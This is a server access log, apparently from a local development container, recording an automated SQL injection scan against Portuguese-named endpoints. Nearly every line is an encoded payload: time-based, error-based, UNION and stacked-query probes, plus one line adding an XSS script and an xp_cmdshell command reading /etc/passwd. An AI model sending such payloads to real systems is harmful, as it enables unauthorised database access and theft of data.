api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%287621%3D7621 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FxqWp HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8560%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2889%29%7C%7CCHR%28111%29%7C%7CCHR%28102%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27NEpj%27%3D%27NEpj HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8560%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2889%29%7C%7CCHR%28111%29%7C%7CCHR%28102%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ruIE%27%3D%27ruIE HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F8560%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2889%29%7C%7CCHR%28111%29%7C%7CCHR%28102%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284150%3D4150 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8560%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2889%29%7C%7CCHR%28111%29%7C%7CCHR%28102%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8560%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2889%29%7C%7CCHR%28111%29%7C%7CCHR%28102%29%2C5%29--%2F%2A%2A%2FLiKw HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FYTzV HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1747--%2F%2A%2A%2Ftwit HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FPEHx HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6908--%2F%2A%2A%2FzKHj HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FMKUy HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F8015--%2F%2A%2A%2FQsmj HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FFGis HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5192--%2F%2A%2A%2FOAga HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FDxOV HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F8560--%2F%2A%2A%2FZtAm HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos?zWdn=2271%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos HTTP/1.1
api-1  | 172.18.0.1 - GET /3525 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%28%22.%2C%29%29.%27%2C%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27Gzbowd%3C%27%22%3ElQXjcM HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F1830%3D8953%2F%2A%2A%2FAND%2F%2A%2A%2F%286453%3D6453 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F1363%3D1363%2F%2A%2A%2FAND%2F%2A%2A%2F%288464%3D8464 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F2573%3D8225 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F1363%3D1363 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8282%3D9749%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27fgTf%27%3D%27fgTf HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1363%3D1363%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ZFyP%27%3D%27ZFyP HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F8656%3D2674%2F%2A%2A%2FAND%2F%2A%2A%2F%27wNWh%27%3D%27wNWh HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F1363%3D1363%2F%2A%2A%2FAND%2F%2A%2A%2F%27uKQW%27%3D%27uKQW HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F2857%3D3512--%2F%2A%2A%2FYsld HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F1363%3D1363--%2F%2A%2A%2FPjgP HTTP/1.1
api-1  | 172.18.0.1 - GET /%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289162%3D7498%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27produtos%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7498%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F2043%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282126%3D2126%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27produtos%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7625%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F6899%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%285280%2CCONCAT%280x5c%2C0x7178706b71%2C%28SELECT%2F%2A%2A%2F%28ELT%285280%3D5280%2C1%29%29%29%2C0x7162787871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285054%3D5054 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%285280%2CCONCAT%280x5c%2C0x7178706b71%2C%28SELECT%2F%2A%2A%2F%28ELT%285280%3D5280%2C1%29%29%29%2C0x7162787871%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%285280%2CCONCAT%280x5c%2C0x7178706b71%2C%28SELECT%2F%2A%2A%2F%28ELT%285280%3D5280%2C1%29%29%29%2C0x7162787871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27jYap%27%3D%27jYap HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%285280%2CCONCAT%280x5c%2C0x7178706b71%2C%28SELECT%2F%2A%2A%2F%28ELT%285280%3D5280%2C1%29%29%29%2C0x7162787871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27QdzP%27%3D%27QdzP HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%285280%2CCONCAT%280x5c%2C0x7178706b71%2C%28SELECT%2F%2A%2A%2F%28ELT%285280%3D5280%2C1%29%29%29%2C0x7162787871%29%29--%2F%2A%2A%2FYTYc HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F1882%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281882%3D1882%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285263%3D5263 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F1882%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281882%3D1882%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1882%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281882%3D1882%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27JtTA%27%3D%27JtTA HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F1882%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281882%3D1882%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27EPYt%27%3D%27EPYt HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F1882%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281882%3D1882%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FFkEW HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F1518%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281518%3D1518%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288774%3D8774 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F1518%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281518%3D1518%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1518%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281518%3D1518%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27YRLT%27%3D%27YRLT HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F1518%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281518%3D1518%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ZHcJ%27%3D%27ZHcJ HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F1518%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281518%3D1518%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FlWfD HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F9720%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289720%3D9720%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285457%3D5457 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F9720%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289720%3D9720%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9720%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289720%3D9720%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27pdlX%27%3D%27pdlX HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F9720%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289720%3D9720%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27SxWw%27%3D%27SxWw HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F9720%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289720%3D9720%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FJAxC HTTP/1.1
api-1  | 172.18.0.1 - GET /%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qxpkq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288189%3D8189%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qbxxq%27%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28110%29%7C%7CCHR%28120%29%7C%7CCHR%2889%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28110%29%7C%7CCHR%28120%29%7C%7CCHR%2889%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28110%29%7C%7CCHR%28120%29%7C%7CCHR%2889%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28110%29%7C%7CCHR%28120%29%7C%7CCHR%2889%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F9424%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29SpLf%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289659%3D9659 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F9424%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29SpLf%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F9424%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29SpLf%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27QfKG%27%3D%27QfKG HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F9424%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29SpLf%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27UfWs%27%3D%27UfWs HTTP/1.1
